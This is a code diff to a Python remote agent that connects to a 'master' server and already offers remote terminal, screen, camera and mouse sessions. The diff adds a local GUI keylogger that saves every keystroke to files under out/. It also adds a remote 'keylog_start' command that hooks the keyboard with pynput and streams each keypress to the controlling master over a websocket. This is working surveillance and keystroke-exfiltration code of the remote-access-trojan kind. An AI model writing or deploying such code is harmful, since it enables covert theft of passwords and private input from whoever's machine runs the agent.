@@ -318,7 +318,87 @@ async def websocket_terminal(websocket: WebSocket):
             SESSION_DIRS.pop(token, None)
 
 
+# Optional local keylogger UI (guarded) for testing
+if __name__ == "__main__" and os.getenv("ENABLE_KEYLOGGER_UI", "0").lower() in ("1","true","yes","on"):
+    try:
+        import tkinter as _tk
+        from tkinter import CENTER as _CENTER, RIGHT as _RIGHT, LEFT as _LEFT
+        from pynput import keyboard as _keyboard
+        from typing import Any as _Any
+        from datetime import datetime as _dt
+        import json as _json
+        import os as _os
 
+        _OUT_DIR = _os.path.join(_os.getcwd(), "out")
+        _os.makedirs(_OUT_DIR, exist_ok=True)
+
+        keys_used: list[dict[str,str]] = []
+        flag: bool = False
+        keys: str = ""
+        now: _dt = _dt.now()
+
+        def _text_path():
+            return _os.path.join(_OUT_DIR, "key_log.txt")
+
+        def _json_path():
+            return _os.path.join(_OUT_DIR, "key_log.json")
+
+        def generate_text_log(key: _Any) -> None:
+            with open(_text_path(), "w", encoding="utf-8") as f:
+                f.write(str(key))
+
+        def generate_json_file(used_keys: _Any) -> None:
+            with open(_json_path(), "wb") as f:
+                f.write(_json.dumps(used_keys).encode("utf-8"))
+
+        def on_press(key: _Any) -> None:
+            global flag, keys_used
+            if not flag:
+                keys_used.append({"Pressed": f"{key}"})
+                flag = True
+            else:
+                keys_used.append({"Held": f"{key}"})
+            generate_json_file(keys_used)
+
+        def on_release(key: _Any) -> None:
+            global flag, keys_used, keys
+            keys_used.append({"Released": f"{key}"})
+            if flag:
+                flag = False
+            generate_json_file(keys_used)
+            keys = keys + str(key)
+            generate_text_log(keys)
+
+        listener = _keyboard.Listener(on_press=on_press, on_release=on_release)
+
+        def start_keylogger():
+            listener.start()
+            label.config(text="[+] Keylogger is running!\n[!] Saving keys in 'out/'")
+            start_button.config(state="disabled")
+            stop_button.config(state="normal")
+
+        def stop_keylogger():
+            try:
+                listener.stop()
+            except Exception:
+                pass
+            label.config(text="Keylogger stopped.")
+            start_button.config(state="normal")
+            stop_button.config(state="disabled")
+
+        root = _tk.Tk()
+        root.title("Keylogger")
+        label = _tk.Label(root, text='Click "Start" to begin key logging...')
+        label.config(anchor=_CENTER)
+        label.pack()
+        start_button = _tk.Button(root, text="Start", command=start_keylogger)
+        start_button.pack(side=_LEFT)
+        stop_button = _tk.Button(root, text="Stop", command=stop_keylogger, state="disabled")
+        stop_button.pack(side=_RIGHT)
+        root.geometry("300x280")
+        root.mainloop()
+    except Exception as _e:
+        print(f"[keylogger-ui] disabled: {_e}")
 # Agent-to-Master connector
 current_agent_dir = os.getcwd()
 
@@ -614,6 +694,8 @@ def _derive_geo_sync() -> tuple[str | None, str | None]:
 interactive_sessions: dict[Any, dict] = {}
 screen_sessions: dict[Any, dict] = {}
 camera_sessions: dict[Any, dict] = {}
+# Keylogger sessions per master connection
+keylog_sessions: dict[Any, Any] = {}
 
 async def _connect_one_master(url: str):
     global command_running, queue_task, queue_current_proc, queue_started_at, command_queue
@@ -1371,6 +1453,58 @@ async def _connect_one_master(url: str):
                             except Exception:
                                 pass
                             continue
+                        if isinstance(data, dict) and data.get("type") == "keylog_start":
+                            try:
+                                loop = asyncio.get_running_loop()
+                                try:
+                                    from pynput import keyboard as _kbd  # type: ignore
+                                except Exception as e:
+                                    try:
+                                        await ws.send(json.dumps({"error": f"[Keylog] missing deps: {e}\n"}))
+                                    except Exception:
+                                        pass
+                                    continue
+                                if ws in keylog_sessions:
+                                    try:
+                                        await ws.send(json.dumps({"output": "[Keylog already running]\n"}))
+                                    except Exception:
+                                        pass
+                                    continue
+                                def _on_press(key):
+                                    try:
+                                        s = str(key)
+                                        loop.call_soon_threadsafe(asyncio.create_task, ws.send(json.dumps({"type":"keylog_line","line": s})))
+                                    except Exception:
+                                        pass
+                                def _on_release(key):
+                                    # no-op; could send on release too
+                                    pass
+                                listener = _kbd.Listener(on_press=_on_press, on_release=_on_release)
+                                await asyncio.to_thread(listener.start)
+                                keylog_sessions[ws] = listener
+                                try:
+                                    await ws.send(json.dumps({"output": "[Keylog started]\n"}))
+                                except Exception:
+                                    pass
+                            except Exception:
+                                pass
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "keylog_stop":
+                            try:
+                                l = keylog_sessions.pop(ws, None)
+                                if l:
+                                    try:
+                                        await asyncio.to_thread(l.stop)
+                                    except Exception:
+                                        pass
+                                try:
+                                    await ws.send(json.dumps({"output": "[Keylog stopped]\n"}))
+                                except Exception:
+                                    pass
+                            except Exception:
+                                pass
+                            continue
+
                         if isinstance(data, dict) and data.get("type") == "mouse":
                             # Remote mouse events (optional)
                             if REMOTE_CONTROL_ENABLED:
